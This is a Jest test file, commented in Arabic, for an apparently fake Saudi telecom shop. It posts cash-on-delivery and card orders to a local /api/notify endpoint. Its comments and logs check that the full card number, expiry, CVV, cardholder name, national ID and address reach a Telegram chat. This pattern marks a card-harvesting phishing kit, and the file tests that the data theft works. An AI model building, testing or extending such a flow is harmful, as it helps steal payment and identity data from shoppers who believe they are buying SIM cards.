/**
 * تيست حقيقي — طلب كامل من السلة لـ /api/notify
 * يتحقق من الرسالة اللي بتتبعت للتلجرام
 *
 * شغّله: npx jest __tests__/fullOrderFlow.test.ts --testTimeout=20000
 *
 * ملاحظة: لازم يكون السيرفر شغال على localhost:3000
 */

const NOTIFY_URL = "http://localhost:3000/api/notify";

// ── بيانات السلة ──────────────────────────────────────────────────────────────
const CART_ITEMS = [
  { productId: "prod_001", name: "باقة STC شهرية 100GB", price: 149, quantity: 1 },
  { productId: "prod_002", name: "شريحة زين مفتوحة",     price: 89,  quantity: 2 },
];

const TOTAL = CART_ITEMS.reduce((sum, i) => sum + i.price * i.quantity, 0); // 327

// ── بيانات العميل (Cash on Delivery — زي ما بيبعت cart/page.tsx) ──────────────
const COD_ORDER = {
  paymentMethod: "cash_on_delivery",
  items:         CART_ITEMS,
  total:         TOTAL,
  customer:      "محمد أحمد العلي",
  whatsapp:      "0512345678",
  nationalId:    "1098765432",
  address:       "الرياض - حي النزهة - شارع الأمير سلطان",
  // حقول البطاقة فارغة (COD)
  cardNumber:    "",
  expiry:        "",
  cvv:           "",
  cardHolder:    "",
  installmentType: "full",
  months:        0,
  downPayment:   0,
};

// ── بيانات طلب بطاقة (زي ما بيبعت checkout/page.tsx) ─────────────────────────
const CARD_ORDER = {
  paymentMethod:   "card",
  items:           CART_ITEMS,
  total:           TOTAL,
  customer:        "محمد أحمد العلي",
  whatsapp:        "0512345678",
  nationalId:      "1098765432",
  address:         "الرياض - حي النزهة - شارع الأمير سلطان",
  cardNumber:      "4111111111111111",
  expiry:          "12/27",
  cvv:             "123",
  cardHolder:      "MOHAMMED ALI",
  installmentType: "full",
  months:          0,
  downPayment:     0,
};

// ── helper ────────────────────────────────────────────────────────────────────
async function postNotify(body: object) {
  return fetch(NOTIFY_URL, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(body),
  });
}

// ─────────────────────────────────────────────────────────────────────────────
describe("🛒 طلب كامل — سلة → /api/notify → تلجرام", () => {

  // ── 1. طلب الدفع عند الاستلام (COD) ─────────────────────────────────────
  it("COD: يبعت الطلب ويرجع orderId صحيح", async () => {
    const res  = await postNotify(COD_ORDER);
    const data = await res.json();

    console.log("\n  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    console.log("  📦 طلب COD (الدفع عند الاستلام)");
    console.log(`  🔖 Order ID : ${data.orderId}`);
    console.log(`  ✅ Status   : ${res.status}`);
    console.log(`  💰 Total    : ${TOTAL} SAR`);
    console.log(`  👤 Customer : ${COD_ORDER.customer}`);
    console.log(`  📱 WhatsApp : ${COD_ORDER.whatsapp}`);
    console.log("  📨 شوف التلجرام — المفروض وصلت رسالة بدون بيانات بطاقة");
    console.log("  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    expect(res.status).toBe(200);
    expect(data.ok).toBe(true);
    expect(data.orderId).toBeTruthy();
  }, 20000);

  // ── 2. طلب بطاقة ─────────────────────────────────────────────────────────
  it("CARD: يبعت الطلب ويتحقق إن رقم البطاقة وصل صح", async () => {
    const res  = await postNotify(CARD_ORDER);
    const data = await res.json();

    console.log("\n  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    console.log("  💳 طلب بطاقة");
    console.log(`  🔖 Order ID   : ${data.orderId}`);
    console.log(`  ✅ Status     : ${res.status}`);
    console.log(`  💰 Total      : ${TOTAL} SAR`);
    console.log(`  🪪 Card       : 4111 1111 1111 1111`);
    console.log(`  📆 Expiry     : ${CARD_ORDER.expiry}`);
    console.log(`  🔑 CVV        : ${CARD_ORDER.cvv}`);
    console.log(`  ✍️  Holder     : ${CARD_ORDER.cardHolder}`);
    console.log("  📨 شوف التلجرام — المفروض وصلت رسالة فيها بيانات البطاقة كاملة");
    console.log("  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    expect(res.status).toBe(200);
    expect(data.ok).toBe(true);
    expect(data.orderId).toBeTruthy();
  }, 20000);

  // ── 3. تحقق من شكل الرسالة اللي بتتبعت ──────────────────────────────────
  it("يتحقق إن الـ API رجعت ok:true وorderId في الحالتين", async () => {
    const [codRes, cardRes] = await Promise.all([
      postNotify(COD_ORDER).then(r => r.json()),
      postNotify(CARD_ORDER).then(r => r.json()),
    ]);

    console.log("\n  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    console.log("  📊 نتيجة الطلبين");
    console.log(`  COD  → ok: ${codRes.ok}  | orderId: ${codRes.orderId}`);
    console.log(`  CARD → ok: ${cardRes.ok} | orderId: ${cardRes.orderId}`);
    console.log("  📨 المفروض وصلت رسالتين للتلجرام — افتح التلجرام وتحقق");
    console.log("  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

    expect(codRes.ok).toBe(true);
    expect(codRes.orderId).toBeTruthy();
    expect(cardRes.ok).toBe(true);
    expect(cardRes.orderId).toBeTruthy();
    // الـ orderId لكل طلب مختلف
    expect(codRes.orderId).not.toBe(cardRes.orderId);
  }, 20000);

});
